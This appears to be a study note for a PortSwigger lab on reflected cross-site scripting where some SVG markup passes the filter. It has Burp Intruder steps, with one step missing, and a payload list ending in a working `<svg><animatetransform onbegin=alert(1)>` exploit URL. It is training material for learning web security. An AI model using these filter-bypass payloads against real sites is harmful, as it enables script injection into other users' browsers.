# Lab: Reflected XSS with some SVG markup allowed

**Official lab:** [https://portswigger.net/web-security/cross-site-scripting/contexts/lab-some-svg-markup-allowed](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-some-svg-markup-allowed)

## Lab idea

The reflected input is filtered to block common markup, but some SVG elements and event attributes remain available. It practices evaluating namespace-specific markup and why tag/event blocklists are fragile.

## Vulnerability in brief
Cross-site scripting (XSS) is a web security vulnerability in which an application causes attacker-controlled content to be interpreted as executable script in a user’s browser. The code runs in the vulnerable site’s origin, so it can interfere with the victim’s interaction with that application and may access data or perform actions available to that user.

## Solution idea
1. Inject a standard XSS payload, such as: <img src=1 onerror=alert(1)>
2. Observe that this payload gets blocked.
3. Open Burp's browser and use the search function in the lab.
4. In the request template, replace the value of the search term with: <>
- …
6. Place the cursor before the = character and click Add § to create a payload position.
7. Visit the XSS cheat sheet and click Copy events to clipboard .
8. In Burp Intruder, in the Payloads side panel, click Clear to remove the previous payloads.

## Payloads / key values
- `<img src=1 onerror=alert(1)>`
- `<>`
- `<§§>`
- `400`
- `<svg>`
- `<animatetransform>`
- `<title>`
- `<image>`
- `200`
- `<svg><animatetransform%20=1>`
- `=`
- `<svg><animatetransform%20§§=1>`
- `onbegin`
- `https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E`

## Official source
- [PortSwigger Academy: Lab: Reflected XSS with some SVG markup allowed](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-some-svg-markup-allowed)
